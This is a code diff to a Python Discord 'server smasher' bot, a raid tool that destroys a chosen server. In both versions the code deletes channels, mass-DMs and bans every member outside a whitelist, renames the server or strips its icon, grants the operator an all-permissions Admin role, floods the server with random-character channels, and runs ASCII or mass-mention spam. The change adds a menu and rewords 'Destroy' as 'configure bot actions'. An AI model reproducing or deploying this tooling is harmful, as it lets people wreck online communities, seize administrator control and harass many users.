@@ -4,6 +4,7 @@ import time
 import random
 import string
 import discord
+import pyperclip
 from discord import Permissions
 import asyncio
 from colorama import init
@@ -32,7 +33,7 @@ async def on_ready():
         print(str(counter)+'. ('+str(x.id)+') '+str(x)+'\n')
         lists.append(x.id)
     print('----------------------------------------')
-    a = int(input('Select the server to Destroy: '))
+    a = int(input('Select the server to configure bot actions: '))
     SERVER = lists[int(a)]
     await main(SERVER)
     
@@ -40,77 +41,114 @@ async def on_ready():
 async def main(SERVER):
     #options
     clear()
-    print ("Destroying server ID: " +str(SERVER))
+    server = client.get_server(id=SERVER)
+    print ("Server: " + server.name)
+    print ("Server ID: " + str(SERVER))
     print ("----------------------------------------")
-    input ("Press enter to start the destruction.")
-    #actions
-    for c in client.get_server(SERVER).channels:
-        myperms = c.permissions_for(client.get_server(SERVER).get_member(client.user.id))
-        if myperms.ban_members:
-            channellist.append(c)
-    for i in client.get_server(SERVER).members:
-        users.append(i)
+    print ("Options:")
+    print (colored(" 1. Destroy with config settings. \n 2. Create Server Invite. \n 3. Leave server.","green"))
+    opts = input ("Select the number for your option: ")
+    try:
+        if int(opts) == 1:
+            #actions
+            for c in client.get_server(SERVER).channels:
+                myperms = c.permissions_for(client.get_server(SERVER).get_member(client.user.id))
+                if myperms.ban_members:
+                    channellist.append(c)
+            for i in client.get_server(SERVER).members:
+                users.append(i)
 
-    if chandel == True:
-        print('Deleting channels.')
-        for channels in channellist:
-            await client.delete_channel(channels)
-        print('Finished deleting channels.')
+            if chandel == True:
+                print('Deleting channels.')
+                for channels in channellist:
+                    await client.delete_channel(channels)
+                print('Finished deleting channels.')
 
-    if senddm == True:
-        for x in users:
-            try:
-                print (colored('Sending DM to ' + str(x),"blue"))
-                await client.send_message(x, dmcontent)
-            except Exception:
-                print (colored("Error sending DM to that user","red"))
+            if senddm == True:
+                for x in users:
+                    try:
+                        print (colored('Sending DM to ' + str(x),"blue"))
+                        await client.send_message(x, dmcontent)
+                    except Exception:
+                        print (colored("Error sending DM to that user","red"))
 
-    if namechange == True:
-        serv = client.get_server(SERVER)
-        await client.edit_server(server=serv, name=str(servname))
+            if namechange == True:
+                serv = client.get_server(SERVER)
+                await client.edit_server(server=serv, name=str(servname))
 
-    if iconbegone == True:
-        serv = client.get_server(SERVER)
-        await client.edit_server(server=serv, icon=None)
+            if iconbegone == True:
+                serv = client.get_server(SERVER)
+                await client.edit_server(server=serv, icon=None)
+                
+            if changeicon == True:
+                icofile = ".\\spammer\\serversmasher\\" + iconfile
+                with open(icofile, 'rb') as handle:
+                    icon = handle.read()
+                    serv = client.get_server(SERVER)
+                    await client.edit_server(serv, icon=icon)
+                    
+            if userban == True:
+                for x in users:
+                    if str(x) in userid:
+                        print (colored("Not Banning " + str(x),"green"))
+                    else:
+                        print (colored('Banning ' + str(x),"blue"))
+                        try:
+                            await client.ban(x)
+                        except Exception:
+                            print(colored('Error Banning that user.',"red"))
 
-    if userban == True:
-        for x in users:
-            if str(x) in userid:
-                print (colored("Not Banning " + str(x),"green"))
+            if gimmieadmin == True:
+                server = client.get_server(SERVER)
+                role = await client.create_role(server, name="Admin", permissions=Permissions.all())
+                user = server.get_member(me)
+                await client.add_roles(user, role)
+
+            if createchan == True:
+                print('Creating channels.')
+                for x in range(int(channelno)):
+                    Serv = discord.Server(id=SERVER)
+                    if chanmethod.lower() == "ascii":
+                        asc = ""
+                        for x in range(60):
+                            num = random.randrange(13000)
+                            asc = asc + chr(num)
+                        print (asc)
+                        await client.create_channel(Serv, asc)
+                    else:
+                        await client.create_channel(Serv, channame)
+            print('Channels Created. Preparing for next stage.')
+
+            if spammethod == "asc":
+                await ascii_spam(SERVER)
+            if spammethod == "massment":
+                await mass_tag(SERVER)
+            
+        elif int(opts) == 2:
+               for server in client.servers:
+                   for channel in server.channels:
+                        if channel.type == discord.ChannelType.text:
+                           invitelinknew = await client.create_invite(destination=channel, xkcd=True, max_uses=100)
+                           invite = invitelinknew.url
+                           pyperclip.copy(invite)
+                           print (invite + " copied to clipboard.")
+                           input ()
+                           await main(SERVER)
+                             
+        elif int(opts) == 3:
+            print ("Are you sure you want to leave this server? (Y/N): ")
+            yn = input()
+            if yn.lower() == 'y':
+                toleave = client.get_server(SERVER)
+                await client.leave_server(toleave)
+                await on_ready()
             else:
-                print (colored('Banning ' + str(x),"blue"))
-                try:
-                    await client.ban(x)
-                except Exception:
-                    print(colored('Error Banning that user.',"red"))
-
-    if gimmieadmin == True:
-        server = client.get_server(SERVER)
-        role = await client.create_role(server, name="Admin", permissions=Permissions.all())
-        user = server.get_member(me)
-        await client.add_roles(user, role)
-
-    if createchan == True:
-        print('Creating channels.')
-        for x in range(int(channelno)):
-            Serv = discord.Server(id=SERVER)
-            if chanmethod.lower() == "ascii":
-                asc = ""
-                for x in range(60):
-                    num = random.randrange(13000)
-                    asc = asc + chr(num)
-                print (asc)
-                await client.create_channel(Serv, asc)
-            else:
-                await client.create_channel(Serv, channame)
-    print('Channels Created. Preparing for next stage.')
-
-    if spammethod == "asc":
-        await ascii_spam(SERVER)
-    if spammethod == "massment":
-        await mass_tag(SERVER)
-
-    
+                await main(SERVER)
+    except Exception as e:
+        print (colored("Error:","red"))
+        print (colored(e,"red"))
+        input()
+        await main(SERVER)
 async def mass_tag(SERVER):
     await asyncio.sleep(5)
     await client.wait_until_ready()
